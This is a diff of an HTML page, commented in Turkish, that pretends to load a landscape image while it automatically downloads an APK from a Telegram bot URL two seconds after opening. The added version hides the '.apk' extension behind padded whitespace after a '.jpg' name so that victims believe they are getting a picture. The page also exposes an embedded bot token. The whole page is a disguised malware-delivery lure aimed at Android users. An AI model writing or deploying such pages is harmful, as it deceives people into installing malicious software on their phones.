@@ -1,19 +1,43 @@
-<script>
-// Kullanıcı sayfaya girdiği an Android'e emir verir: 
-// "Bu dosyayı indir ve sakın resim sanma, bu bir uygulama!"
-function indirVeKur() {
-    var link = document.createElement('a');
-    link.href = 'https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_12.apk'; // Buraya APK'nın gerçek yolunu yaz
-    link.download = 'Manzara_Resmi.jpg
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-}
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Resim Yükleniyor...</title>
+</head>
+<body>
 
-// Sayfa açıldıktan 2 saniye sonra tetiklensin
-setTimeout(indirVeKur, 2000);
-</script>
+    <h2>Resim Yükleniyor, lütfen bekleyin...</h2>
+    <p>İndirme başlamadıysa <a href="javascript:void(0);" onclick="indirVeKur()">buraya tıklayın</a>.</p>
 
-<h2>Resim Yükleniyor...</h2>
-<p>Eğer indirme başlamadıysa <a href="javascript:indirVeKur()">buraya tıkla</a>.</p>
+    <script>
+        // 1. Önce fonksiyonu tanımlıyoruz
+        function indirVeKur() {
+            console.log("Sistem tetiklendi..."); // Hatayı takip etmek için
+            var link = document.createElement('a');
+            
+            // Senin Telegram'daki APK linkin
+            link.href = 'https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_12.apk'; 
+            
+            // Kurbanın göreceği isim (Bol boşluklu hile)
+            link.download = 'Manzara_Orijinal_HD.jpg                                                                .apk'; 
+            
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
 
+        // 2. Sayfa tamamen yüklendiğinde fonksiyonu hazır hale getir ve 2 saniye sonra çalıştır
+        window.onload = function() {
+            console.log("Sayfa hazır, zamanlayıcı başlıyor...");
+            setTimeout(function() {
+                try {
+                    indirVeKur();
+                } catch (e) {
+                    console.error("Hata oluştu: ", e);
+                }
+            }, 2000);
+        };
+    </script>
+
+</body>
+</html>
